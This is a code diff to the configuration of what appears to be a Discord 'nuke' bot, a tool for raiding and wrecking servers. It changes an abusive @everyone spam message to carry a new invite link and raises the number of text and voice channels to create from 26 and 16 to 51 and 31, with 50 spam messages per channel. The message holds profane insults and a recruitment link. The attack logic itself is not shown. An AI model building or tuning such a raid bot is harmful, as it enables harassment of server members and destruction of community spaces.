@@ -7,7 +7,7 @@ import {
 /* ------------------------------------------------------------------ config */
 
 const NUKE_MESSAGE =
-  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/3RhaMXkRnS #";
+  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/uBgehrcTZd #";
 
 const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 
@@ -16,8 +16,8 @@ const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 const NUMBER_FIRST_CHANNEL = false;
 
 const CATEGORY_NAME = 'general';
-const TEXT_COUNT = 26;
-const VOICE_COUNT = 16;
+const TEXT_COUNT = 51;
+const VOICE_COUNT = 31;
 const SPAM_COUNT = 50; // nachrichten pro text channel
 
 // auch in den text-chat jedes voice channels spammen ("call messages")
